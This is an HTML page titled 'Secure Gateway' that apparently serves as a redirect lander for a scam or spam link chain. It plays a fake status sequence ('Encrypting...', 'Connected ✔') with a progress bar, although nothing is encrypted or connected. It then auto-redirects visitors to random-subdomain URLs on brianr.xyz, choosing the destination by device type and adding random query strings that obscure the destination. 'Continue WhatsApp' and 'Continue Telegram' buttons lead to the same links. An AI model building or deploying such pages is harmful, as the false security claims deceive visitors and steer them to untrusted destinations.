<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Gateway</title>

<style>
* {
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: 'Inter', sans-serif;
}

body {
  height:100vh;
  background:
    radial-gradient(circle at 20% 20%, rgba(34,197,94,0.15), transparent 40%),
    radial-gradient(circle at 80% 80%, rgba(14,165,233,0.15), transparent 40%),
    #020617;
  display:flex;
  justify-content:center;
  align-items:center;
  color:white;
  overflow:hidden;
}

/* GRID EFFECT */
body::after {
  content:"";
  position:absolute;
  width:100%;
  height:100%;
  background-image:
    linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
  background-size:40px 40px;
  opacity:0.3;
}

/* GLOW */
body::before {
  content:"";
  position:absolute;
  width:500px;
  height:500px;
  background:#22c55e;
  filter:blur(180px);
  opacity:0.12;
  animation:move 6s infinite alternate;
}

@keyframes move {
  from { transform:translate(-100px,-100px);}
  to { transform:translate(100px,100px);}
}

.card {
  width:90%;
  max-width:380px;
  padding:30px 20px;
  border-radius:24px;
  background:rgba(255,255,255,0.05);
  backdrop-filter:blur(30px);
  box-shadow:0 30px 80px rgba(0,0,0,0.7);
  text-align:center;
  animation:fadeUp 0.5s ease;
}

@keyframes fadeUp {
  from {opacity:0; transform:translateY(20px);}
  to {opacity:1; transform:translateY(0);}
}

.icon {
  font-size:42px;
  animation:pulse 1.5s infinite;
}

@keyframes pulse {
  0%,100%{transform:scale(1);}
  50%{transform:scale(1.1);}
}

.title {
  font-size:22px;
  font-weight:600;
  margin-top:10px;
}

.subtitle {
  font-size:13px;
  color:#94a3b8;
  margin:10px 0 15px;
}

.status {
  font-size:13px;
  color:#22c55e;
  min-height:18px;
}

.progress {
  height:5px;
  background:rgba(255,255,255,0.1);
  border-radius:10px;
  overflow:hidden;
  margin:12px 0;
}

.bar {
  height:100%;
  width:0%;
  background:linear-gradient(90deg,#22c55e,#4ade80);
  transition:0.2s;
}

.btn {
  width:100%;
  padding:13px;
  border:none;
  border-radius:14px;
  margin-top:6px;
  font-weight:600;
  cursor:pointer;
  transition:0.2s;
}

.btn-wa {background:#22c55e;}
.btn-tg {background:#0ea5e9;}

.btn:hover {
  transform:scale(1.04);
}

.footer {
  font-size:11px;
  color:#64748b;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="card">
  <div class="icon">🔐</div>
  <div class="title">Secure Gateway</div>
  <div class="subtitle">Establishing encrypted connection...</div>

  <div class="status" id="status">Booting system...</div>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <button class="btn btn-wa" onclick="manualWA()">Continue WhatsApp</button>
  <button class="btn btn-tg" onclick="manualTG()">Continue Telegram</button>

  <div class="footer">Secure Routing v3.2</div>
</div>

<script>

// ===== CONFIG =====
const waLinks = [
  "http://selinapriscilla.brianr.xyz/11d9879a49eaab3d19aeb4c5dc609f82",
  "http://selinapriscilla.brianr.xyz/11d9879a49eaab3d19aeb4c5dc609f82"
];

const tgLinks = [
  "http://kalieannette.brianr.xyz/8496853cc396d231ea3dac6504d8fecb"
];

// ===== RANDOMIZER =====
function randomize(link){
  return link + "?v=" + Math.floor(Math.random()*999999);
}

// ===== DEVICE DETECT =====
function isMobile(){
  return /Android|iPhone/i.test(navigator.userAgent);
}

// ===== SMART REDIRECT =====
function redirectSmart(){
  let links = isMobile() ? waLinks : tgLinks;
  let target = links[Math.floor(Math.random()*links.length)];
  window.location.href = randomize(target);
}

// ===== STATUS SYSTEM (DIPERCEPAT) =====
const steps = [
  "Initializing...",
  "Encrypting...",
  "Connecting...",
  "Connected ✔"
];

let i = 0;
let progress = 0;

let status = document.getElementById("status");
let bar = document.getElementById("bar");

let interval = setInterval(()=>{

  if(i < steps.length){
    status.innerText = steps[i];
    i++;
  }

  progress += 35 + Math.random()*20; // LEBIH CEPAT
  if(progress > 100) progress = 100;

  bar.style.width = progress + "%";

  if(progress >= 100){
    clearInterval(interval);

    setTimeout(()=>{
      redirectSmart();
    }, 300); // SUPER CEPAT
  }

}, 300); // DARI 700 -> 300

// ===== BUTTON MANUAL =====
function manualWA(){
  window.location.href = randomize(waLinks[0]);
}

function manualTG(){
  window.location.href = randomize(tgLinks[0]);
}

</script>

</body>
</html>
